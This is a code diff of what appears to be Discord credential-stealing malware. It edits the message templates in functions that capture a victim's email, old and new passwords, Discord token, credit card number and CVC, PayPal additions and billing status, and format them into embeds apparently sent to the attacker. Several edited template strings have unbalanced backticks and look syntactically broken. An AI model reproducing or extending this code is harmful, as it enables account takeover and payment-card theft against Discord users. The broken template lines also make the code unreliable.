@@ -663,12 +663,12 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Info:**',
-            value: `📧Email: `${email}` - 🔒Password: `${password}`,
+            value: `**📧Email:** `${email}` - **🔒Password:** `${password}`,
             inline: false,
           },
           {
             name: '**Discord Info:**',
-            value: `🚀Nitro Type: **${nitro}**\n🎖️Badges: **${badges}**\n💵Billing: **${billing}**`,
+            value: `**🚀Nitro Type:** `${nitro}`\n**🎖️Badges:** `${badges}`\n**💵Billing:** `${billing}``,
             inline: false,
           },
           {
@@ -702,12 +702,12 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed:**',
-            value: `📧Email: `${json.email}`\n🔓Old Password: `${oldpassword}`\n🔒New Password: `${newpassword}``,
+            value: `**📧Email:** `${json.email}`\n**🔓Old Password:** `${oldpassword}`\n**🔒New Password:** `${newpassword}``,
             inline: true,
           },
           {
             name: '**Discord Info:**',
-            value: `🚀Nitro Type: **${nitro}**\n🎖️Badges: **${badges}**\n💵Billing: **${billing}**`,
+            value: `**🚀Nitro Type:** **${nitro}**\n**🎖️Badges:** `${badges}`\n**💵Billing:** `${billing}``,
             inline: true,
           },
           {
@@ -741,12 +741,12 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed:**',
-            value: `📧New Email: `${email}`\n🔒Password: **${password}**`,
+            value: `**📧New Email:** `${email}`\n**🔒Password:** `${password}``,
             inline: true,
           },
           {
             name: '**Discord Info:**',
-            value: `🚀Nitro Type: **${nitro}**\n🎖️Badges: **${badges}**\n💵Billing: **${billing}**`,
+            value: `**🚀Nitro Type:** `${nitro}**\n**🎖️Badges:** `${badges}`\n**💵Billing:** `${billing}``,
             inline: true,
           },
           {
@@ -785,7 +785,7 @@ const PaypalAdded = async (token) => {
           },
           {
             name: '**Discord Info:**',
-            value: `🚀Nitro Type: **${nitro}**\n🎖️Badges: **${badges}**\n💵Billing: **${billing}**`,
+            value: `**🚀Nitro Type:** `${nitro}`\n**🎖️Badges:** `${badges}`\n**💵Billing:** `${billing}``,
             inline: false,
           },
           {
@@ -824,7 +824,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
           {
             name: '**Discord Info**',
-            value: `🚀Nitro Type: **${nitro}**\n🎖️Badges: **${badges}**\n💵Billing: **${billing}**`,
+            value: `**🚀Nitro Type:** `${nitro}`\n**🎖️Badges:** `${badges}`\n**💵Billing:** `${billing}``,
             inline: true,
           },
           {
@@ -865,7 +865,7 @@ const nitroBought = async (token) => {
           },
           {
             name: '**Discord Info**',
-            value: `🚀Nitro Type: **${nitro}**\n🎖️Badges: **${badges}**\n💵Billing: **${billing}**`,
+            value: `**🚀Nitro Type:** `${nitro}`\n**🎖️Badges:** `${badges}`\n**💵Billing:** `${billing}``,
             inline: true,
           },
           {
